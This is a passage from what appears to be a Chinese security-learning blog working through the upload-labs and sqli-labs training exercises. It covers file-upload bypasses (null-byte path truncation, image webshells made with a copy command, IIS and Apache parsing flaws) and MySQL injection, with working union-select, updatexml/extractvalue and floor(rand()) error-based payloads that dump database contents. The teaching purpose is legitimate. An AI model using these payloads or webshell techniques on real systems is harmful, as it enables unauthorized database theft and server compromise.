<p><code>Pass-12</code>中<code>save_path</code>变量是可以可以get传参的，所以我们只需要在url中加入类似<code>?save_path=./upload/cmd.php%00</code>，上传文件名类似于<code>cmd.jpg</code>就能将文件保存在<code>./upload/cmd.php</code>中</p>
<h2 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h2><p>这也是一种检测方式，通常利用文件头校验原理，对用户上传的文件内容进行检测，判定其文件类型。</p>
<p>这种检测方式的绕过一般上传图片马，配合文件包含漏洞，获取<code>webshell</code>。在文件包含漏洞中，对包含文件的类型无要求，只要包含文件中含有PHP代码即可执行。</p>
<blockquote>
<p>使用CMD制作一句话木马。<br>参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件<br>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件<br>copy 1.jpg/b+1.php 2.jpg<br>//意思是将1.jpg以二进制与1.php合并成2.jpg<br>那么2.jpg就是图片木马了。</p>
</blockquote>
<p>这里用<code>upload-labs Pass-14</code>进行举例，服务端过滤代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中就是对文件内容进行了检测，我们制作图片马进行绕过</p>
<p><img src="https://s1.ax1x.com/2020/04/03/Ga6eOO.png" alt="Ga6eOO.png"></p>
<p>可以看到图片16进制中含有php代码了</p>
<p><img src="https://s1.ax1x.com/2020/04/03/GaR0bT.png" alt="GaR0bT.png"></p>
<p>可以看到配合文件包含漏洞执行了php代码</p>
<p><img src="https://s1.ax1x.com/2020/04/03/GaR5VO.png" alt="GaR5VO.png"></p>
<p><code>Pass-14</code>和<code>Pass-15</code>以及<code>Pass-16</code>都可以用上述的图片马进行绕过，因为他们的原理都是对文件头类型进行检测识别，但是对于<code>Pass-17</code>就不同，<code>Pass-17</code>是对图片进行二次渲染，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致意思是服务端端调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
<p>这种过滤方式不管是直接修改文件头来制作的图片马，还是利用<code>copy</code>命令制作的图片马，都无法避免其中的一句话被过滤掉。</p>
<p>其实绕过的话就要把一句话插入到图片数据中，这样经过渲染后这部分数据还是会保留下来。可以参考这篇：</p>
<p><a href="https://secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">BookFresh Tricky File Upload Bypass to RCE</a></p>
<p>可以看到其所用到的<code>POC.gif</code>中含有php代码：</p>
<p><img src="https://s1.ax1x.com/2020/04/03/Gahhq0.png" alt="Gahhq0.png"></p>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>什么是解析漏洞？</p>
<p>解析漏洞指的是在服务器中间件上的问题，要想获得<code>webshell</code>，那一定要让服务器将攻击者上传的文件当作后端脚本来解析，但是通常的后端具有检测技术，可以检测到攻击者上传的<code>webshell</code>，但是开发人员如果仅从代码角度去防止<code>webshell</code>，那么他就忽略了服务器中间件的漏洞危害，中间件像Apache，Nginx，IIS，Tomcat等，在有些版本中存在解析漏洞，可以使攻击者利用这些解析漏洞，绕过开发人员的检测，实现非法文件的解析。</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>在Apache 1.x和2.x中存在解析漏洞 ，解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断，如果都不认识，那么就暴漏其源代码。</p>
<p>因此可以上传一个test.php.qwea文件绕过验证且服务器依然会将其解析为php文件。</p>
<p>Apache能够认识的文件在mime.types文件里。</p>
<p><img src="https://s1.ax1x.com/2020/04/04/G0mulV.png" alt="G0mulV.png"></p>
<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS 6在解析文件时，也出现过一些漏洞</p>
<ol>
<li><p>在IIS 6和Windows环境下出现过<code>;</code>字符截断文件名的问题</p>
<p>当文件名为： <code>shell.asp;xx.jpg</code>时，IIS 6会将此文件解析为<code>shell.asp</code>，文件名被截断了，从而导致脚本被执行</p>
<p>所以当上传文件<code>shell.asp;xx.jpg</code>时，检测程序只会检测出后缀名为<code>.jpg</code>，如果不讲文件重命名存入服务器中，那么攻击者就可以访问<code>shell.asp;xx.jpg</code>，其中IIS 6会将文件当成<code>.asp</code>脚本解析。</p>
</li>
<li><p>IIS 6中还有一个漏洞就是目录解析的问题，因为处理文件夹扩展名出错，导致将<code>/*.asp/</code>目录下所有文件都作为ASP文件进行解析。</p>
<p>例如：建立<code>shell.asp</code>文件夹，在文件夹中新建一个文本文档<code>test.txt</code>，其中包含诸如<code>&lt;%=NOW()%&gt;</code>的asp代码，那么在访问例如<code>http://www.example.com/shell.asp/test.txt</code>，就会执行该代码。</p>
</li>
<li><p>在IIS中，还存在一种经典漏洞，就是<code>WebDav</code>，<code>WebDav</code>是一种基于HTTP 1.1协议的通信协议，它扩展了HTTP协议，使其在标准方法外新增了一些新的方法。</p>
<p>在开启<code>WebDav</code>扩展的服务器中，如果支持<code>PUT``Move``Copy``Delete</code>等方法，就有可能存在安全隐患</p>
<p>比如：可以先用<code>OPTIONS</code>先探测服务器所支持的HTTP方法，然后使用<code>PUT</code>方式上传脚本文件，再用<code>Move</code>或者<code>Copy</code>对文件进行改名，使之能被服务器所解析。</p>
</li>
</ol>
<p>更多的解析漏洞可以看这篇<a href="https://www.smi1e.top/文件解析漏洞总结/" target="_blank" rel="noopener">博客</a>，我的学识浅薄，目前也在学，之后要是碰到了新的关于文件上传的漏洞也会不断更新学习。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/03/21/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        SQL注入漏洞是目前web安全中最为高危漏洞之一，在OWASP常年排名第一(截至2020.3.21)，也是最为常见的漏洞之一，虽然随着开发人员安全意识的提高和开发工程的模板化，SQL注入不再像以前那么随处可见且没有任何防护，但是渗透技术也日趋复杂多样，而且提供web服务的企业太多了，并不是每一个企业的web服务都具有良好的安全防护措施，所以SQL注入目前还是渗透人员必须所具备的能力之一。</p>
<p>​        对大多数数据库而言，SQL注入的原理是类似的，因为每个SQL数据库都要一定的遵守SQL语法，但它们之间存在一些差异，本文章因为技术有限，使用市面上常用的SQL数据库——MySQL数据库进行举例说明，但疏通同归，攻击者对数据库的注入，其利用方式也是类似的：</p>
<ul>
<li>查询数据</li>
<li>读写文件</li>
<li>执行命令</li>
</ul>
<p>​        在权限允许的情况下，通常数据库都支持以上三种操作，而且攻击者的最终目的也是以上三种，只不过不同数据库注入的SQL语句不一样而已。</p>
<p>​        通常的SQL注入可以使用工具，比如SQLmap，其内置了很多功能，全面而强大，但是还是要掌握一些手动注入的方式，才能真正了解SQL注入。</p>
<a id="more"></a>

<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="SQL注入的产生"><a href="#SQL注入的产生" class="headerlink" title="SQL注入的产生"></a>SQL注入的产生</h2><p>​        其实SQL注入漏洞的产生不难理解，就是用户在前端输入的数据交付给后端，数据要和SQL语句拼接成为完整的SQL语句，而此时后端对用户输入数据过滤不严，将其直接带入SQL语句进入SQL数据库查询，并且将结果返回到前端显示位上。</p>
<p>​        可以从程序的角度去理解这句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F; take the variables </span><br><span class="line">if(isset($_GET[&#39;id&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#x2F;&#x2F;logging the connection parameters to a file for analysis.</span><br><span class="line">$fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);</span><br><span class="line">fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br><span class="line">$row &#x3D; mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo &quot;&lt;font size&#x3D;&#39;5&#39; color&#x3D; &#39;#99FF00&#39;&gt;&quot;;</span><br><span class="line">  	echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &#39;Your Password:&#39; .$row[&#39;password&#39;];</span><br><span class="line">  	echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">	echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>(以上程序截取自sqli-Less1)</p>
<p>发现其中<code>$id</code>是来自前端<code>$_GET</code>传参进来，但在php程序中未经任何处理就直接拼接成SQL语句：</p>
<p><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>
<p>这就造成了SQL注入</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ol>
<li><p>依据变量类型：</p>
<ul>
<li>数字型注入</li>
<li>字符型注入</li>
</ul>
</li>
<li><p>依据传参方式：</p>
<ul>
<li>GET注入</li>
<li>POST注入</li>
<li>Cookie注入</li>
</ul>
</li>
<li><p>依据注入的方式：</p>
<ul>
<li>报错注入</li>
<li>延时注入</li>
<li>布尔盲注</li>
<li>DNSlog注入</li>
<li>。。。。。(SQL注入的方式很多，甚至有更多骚操作不断被人发现利用中)</li>
</ul>
</li>
</ol>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>​        当输入的变量为整型时，若存在注入点，则可以称为数字型注入。</p>
<blockquote>
<p>eg：假设有URL为<code>HTTP://www.sqlinject.com/test.php?id=3</code></p>
<p>若SQL语句为<code>select * from table where id=3</code>则此时参数为整型</p>
<p>可以通过以下步骤检测是否有注入：</p>
<ol>
<li>id=3’  发现报错 SQL语句为<code>select * from table where id=3&#39;</code></li>
<li>id=3 and 1=1 无错误 SQL语句为<code>select * from table where id=3 and 1=1</code></li>
<li>id=3 and 1=2 语句正常但无法查出数据 SQL语句为<code>select * from table where id=3 and 1=2</code></li>
</ol>
</blockquote>
<p>​        数字型注入一般出现在ASP，PHP等弱类型语言中，因为弱类型语言会自动推导变量类型，例如：id=3时，会认为id变量为int类型，而id=3 and 1=1时，则会推导为string类型，这是弱类型语言的特性。</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>​        当输入参数为字符串时，称为字符型。而字符型数据在注入的时候需要单引号 <code>&#39;</code> 去进行闭合。</p>
<p>​        例如： <code>select * from table where username=&#39;root&#39;</code></p>
<p>​        而此时注入就要用到单引号闭合：  <code>select * from table where username=&#39;root&#39; order by 4--+&#39;</code>(猜解列数)</p>
<h3 id="POST注入-amp-GET注入-amp-Cookie-注入"><a href="#POST注入-amp-GET注入-amp-Cookie-注入" class="headerlink" title="POST注入 &amp;GET注入&amp;Cookie 注入"></a>POST注入 &amp;GET注入&amp;Cookie 注入</h3><p>​        这三种注入类似，主要依据注入的位置来分辨，根据名称也很好理解，无非是表单在传输数据的方式有所不同，注意的是，cookie注入依据是php中<code>$_REQUEST</code>变量（默认情况下包含了 <code>$_GET</code>，<code>$_POST</code>和 <code>$_COOKIE</code>的数组），在GET和POST都做了输入过滤的时候，可以通过构造cookie变量形成注入。（但是这一特性在PHP5.4版本就不接受cookie传参了）</p>
<h1 id="SQL手动注入"><a href="#SQL手动注入" class="headerlink" title="SQL手动注入"></a>SQL手动注入</h1><h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><p>MySQL数据库是现在最为常用的数据库，一般和PHP组成后端黄金搭档，在SQL注入里，关于MySQL数据库也有很多技巧。</p>
<ol>
<li><p>在MySQL5.0以后的版本，DBMS会自带一个信息数据库INFORMATION_SCHEMA，里面提供了访问元数据的一些方式。在INFORMATION_SCHEMA中有很多关键信息表：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/GSUAnx.png" alt="GSUAnx.png"></p>
<p>在进行SQL注入的时候可以从这个信息数据库下手得到关键信息，如果没有这个表怎么办，当然也可以通过爆破获得关键信息，这个时候就要借助SQL注入工具来实现</p>
<ol start="2">
<li>一些相关函数：</li>
</ol>
<p>Database()                        返回当前所使用的数据库名称</p>
<p>Version()                           返回当前版本信息</p>
<p>user()                                返回当前用户信息</p>
<p>group_concat(name)         将name列以一行返回</p>
<p>Ascii()                                返回参数的ASCII值</p>
<p>length()                              返回长度</p>
<p>count()                               返回元组个数</p>
<p>if(a, b, c)                            条件语句，等价于 a?b:c</p>
<p>sleep()                               睡眠函数</p>
<p>substr()                         截取字符串长度</p>
<p>load_file()                          读文件操作，需要用户具有FILE权限，且读取文件小于max_allowed_packet字节</p>
<p>into outfile()                        写文件操作，需要用户具有FILE权限</p>
<ol start="3">
<li>MySQL中的注释符</li>
</ol>
<ul>
<li><code>#</code></li>
<li><code>--+</code></li>
<li><code>/*注释中间*/</code></li>
<li><code>;%00</code>(00截断原理，成功率不是很高)</li>
</ul>
</li>
</ol>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>​        联合查询是使用MySQL中的UNION查询，其用于把来自多个SELECT语句的结果组合到一个结果集合中，且每列的数据类型必须相同，而且UNION连接的SELECT语句中列数也要相同。</p>
<h3 id="猜解列数"><a href="#猜解列数" class="headerlink" title="猜解列数"></a>猜解列数</h3><p>​        在使用UNION前首先得知道列数，才能构造正确的联合查询语句，可以使用ORDER BY字句：</p>
<p>​        我们用sqli举例：</p>
<p>​        此时我们用order by 3 ，让查询结果根据第三列排序</p>
<p><img src="https://s1.ax1x.com/2020/03/23/8HsvtA.png" alt="8HsvtA.png"></p>
<p>​        结果没问题，再次测试order by 4</p>
<p><img src="https://s1.ax1x.com/2020/03/23/8HyZhn.png" alt="8HyZhn.png"></p>
<p>​        此时就知道该结果有三列</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>​        当知道列数的时候，就可以写出payload查询数据的信息：</p>
<p>比如：</p>
<p>查询数据库版本和当前数据库名：<code>?id=&#39;union select 1,version(),database()--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/23/8H6CCR.png" alt="8H6CCR.png"></p>
<p>注意：页面的显示位只有两个，猜测为查询结果的第一个元组的第二三列属性，所以此时将前一个select语句查询结果置空，并且让第二个查询语句中第一列参数无意义。</p>
<p>这个时候其实这个注入点就有很多利用方式了，主要在于payload编写的目的用途：</p>
<p>查看所有库名字和当前库的所有表名：<code>?id=&#39;union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=database()--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/23/8Hg8Ag.png" alt="8Hg8Ag.png"></p>
<p>此处用group_concat()是为了让结果按行输出，才能正确输出到显示位上。</p>
<p>其他的payload类似，可以通过先获取全部的数据库名，在获取全部表名，再把所有列名获取，这样就可以获取DBMS中全部的数据了。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​        攻击者使用各种手段使程序报错，爆出相应的数据信息。前提是开发者讲sql语句的错误显示到页面上(具体的话或许开发人员开发时显示错误信息进行调试，结果忘记删除语句或者留者下次使用)。</p>
<p>​        一般是在页面没有显示位、但用<code>echo mysql_error();</code>输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>​        concat(str1, str2)    将字符串首尾相连</p>
<p>​        updatexml((XML_document, XPath_string, new_value) 第一个参数：xml文档的名称，第二个参数：xpath格式的字符串，第三个参数：替换查找到的符合条件的数据</p>
<p>​        extractvalue(xml_str , Xpath)  第一个参数意思是传入xml文档，第二个参数xpath意思是传入文档的路径</p>
<h3 id="利用xmlpath报错"><a href="#利用xmlpath报错" class="headerlink" title="利用xmlpath报错"></a>利用xmlpath报错</h3><p>​        在XPath处加上特殊字符，并加上查询语句，MySQL就会将错误和查询语句结果报错显示出来</p>
<p>注意：</p>
<ol>
<li>必须在XPath传入特殊字符，MySQL才会报错</li>
<li>XPath只会对特殊字符进行报错，这里可以用~，16进制的0x7e来进行利用</li>
<li>XPath只会报错32个字符，所以要用到substr</li>
</ol>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>还是以sqli-less1举例，这里输出了mysql_error()，注意的是这里的注入点id是一个字符型注入，需要加<code>&#39;</code>进行闭合</p>
<p><code>?id=1&#39;and updatexml(1,concat(0x7e,version(),0x7e),1)--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8Os2kD.png" alt="8Os2kD.png"></p>
<p>可以发现这里将MySQL的版本信息显示了出来</p>
<p><code>?id=1&#39;and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,32) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8OyE9J.png" alt="8OyE9J.png"></p>
<p>这里使用<code>substr</code>函数是为了在XPath报错长度限制下进行分段输出，但是此时<code>group_concat(table_name)</code>的长度小于32，也可以不加<code>substr</code></p>
<p>除了updatexml函数，也可以使用extractvalue函数</p>
<p><code>1&#39;and extractvalue(1,concat(0x7e,version()))--+</code></p>
<p><img src="https://s1.ax1x.com/2020/03/25/8O6HJg.png" alt="8O6HJg.png"></p>
<p>extractvalue函数原理和updatexml函数类似，payload也相同，按照格式也可以写出其他payload将数据库所有信息查询出来。</p>
<h3 id="基于主键重复的报错注入"><a href="#基于主键重复的报错注入" class="headerlink" title="基于主键重复的报错注入"></a>基于主键重复的报错注入</h3><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考文章</a>(这篇博客非常棒，通俗易懂的介绍了这种报错注入原理)</p>
<h4 id="相关函数-1"><a href="#相关函数-1" class="headerlink" title="相关函数"></a>相关函数</h4><ol>
<li>floor()            向下取整</li>
<li>rand()            0到1之间取随机数</li>
<li>rand(0)           0到1之间取随机数，伪随机机制，有规律(0110 0110)</li>
</ol>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol>
<li><p>group by 语句后跟的为主键，其值具有唯一性，当不唯一重复时会报错。</p>
</li>
<li><p>group by语句后面的字段会被运算两次。</p>
<p><strong>第一次：</strong>group by后面的字段值拿到虚拟表中去对比，对比之前要运算group by后面字段的值，所以第一次的运算就发生在这里。</p>
<p><strong>第二次：</strong>现在假设下一次扫描的字段的值没有在虚拟表中出现，也就是group by后面的字段的值在虚拟表中还不存在，那么就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致错误！</p>
</li>
<li><p>例如payload：<code>select count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from users group by x</code></p>
<p><code>group by</code>会根据<code>x</code>也就是<code>concat(floor(rand(0)*2),(select version()))</code>取遍历基本表的行数，查询虚拟表，假设当前<code>version()</code>为5.7.26，第一次遍历计算得到<code>0@5.7.26</code>，虚拟表没有，则插入，但此时经过二次计算又得到<code>1@5.7.26</code>，在虚拟表中记录<code>1    1@5.7.26</code>，前面的1是count的值。group by再次遍历计算得到<code>1@5.7.26</code>，表中具有这个主键值，所以直接修改count值即可，不再计算，所以虚拟表就变为<code>2    1@5.7.26</code>，第三次group by遍历计算得到<code>0@5.7.26</code>，虚拟表中没有这个，需要新的元组插入，插入时经历第二次计算，得到<code>1@5.7.26</code>，但是<code>1@5.7.26</code>再虚拟表中已经有了，而且<code>x</code>是主码，此时就会报错，并且将<code>1@5.7.26</code>显示到前端显示位上</p>
</li>
</ol>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p>还是以sqli-less1举例，因为这里输出了mysql_error()</p>
<p><code>?id=1&#39;union select 1,count(*),(concat(floor(rand(0)*2),&#39;@&#39;,(select version())))x from information_schema.columns group by x --+</code></p>
<p>注意的是这里后面联合查询用的表是<code>information_schema.columns</code>，因为这个表是一定存在的(MySQL版本大于5.0)，当然你也可以使用例如：<code>information_schema.tables</code>，<code>information_schema.schemata</code></p>
